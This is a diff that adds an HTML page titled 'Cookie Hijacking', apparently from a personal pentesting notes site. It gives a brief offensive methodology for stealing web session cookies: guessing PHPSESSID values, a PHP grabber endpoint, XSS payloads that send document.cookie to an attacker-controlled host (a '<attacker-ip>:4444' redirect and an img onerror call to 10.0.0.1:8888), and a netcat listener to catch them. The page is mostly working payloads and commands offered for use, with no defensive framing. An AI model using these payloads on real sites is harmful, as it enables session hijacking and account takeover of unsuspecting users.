@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Cookie Hijacking - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Cookie Hijacking", url: "#_top", children: [
+              {title: "Cookie Manipulation", url: "#cookie-manipulation" },
+              {title: "PHP Cookie Grabbing with XSS", url: "#php-cookie-grabbing-with-xss" },
+              {title: "Python Cookie Stealer with XSS", url: "#python-cookie-stealer-with-xss" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="cookie-hijacking">Cookie Hijacking</h1>
+<p>A methodology of manipulating, grabbing cookies.</p>
+<div class="language-text highlight"><pre><span></span><code>- [WebHacking101](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md)
+</code></pre></div>
+<h2 id="cookie-manipulation">Cookie Manipulation</h2>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Cookie: PHPSESSID=0
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Cookie: PHPSESSID=1
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Cookie: PHPSESSID=999
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="cm">&lt;!-- ASCII Hex --&gt;</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>Cookie: PHPSESSID=3836382d61646d696e
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="php-cookie-grabbing-with-xss">PHP Cookie Grabbing with XSS</h2>
+<p>In your local machine, create the payload for grabbing the cookie when the other user will access your machine.  </p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="x">// steal_cookie.php</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cookie&#39;</span><span class="p">];</span> <span class="cp">?&gt;</span>
+</span></code></pre></div>
+<p>Create the JavaScript code to force users to access your machine which shows the victim's cookie value.</p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;http://&lt;attacker-ip&gt;:4444/steal_cookie.php?cookie=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></div>
+<p>POST request with this JavaScript code to the target web page.<br />
+Open listner in your local machine and wait for the other users will access the target web page.</p>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div>
+<p><br /></p>
+<h2 id="python-cookie-stealer-with-xss">Python Cookie Stealer with XSS</h2>
+<p><a href="https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py">This script</a> is useful to steal Cookie. <br />
+To start web server, execute the Python script as below.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>python2<span class="w"> </span>XSS-cookie-stealer.py
+</span></code></pre></div>
+<p>Then inject our XSS to steal Cookie via our web server.<br />
+For instance,</p>
+<div data-pagefind-ignore>
+
+<div class="language-html highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">this.src=&#39;http://10.0.0.1:8888/?&#39;+document.cookie;</span><span class="p">&gt;</span>
+</span></code></pre></div>
+
+</div>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/web/cookie/cookie-hijacking.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
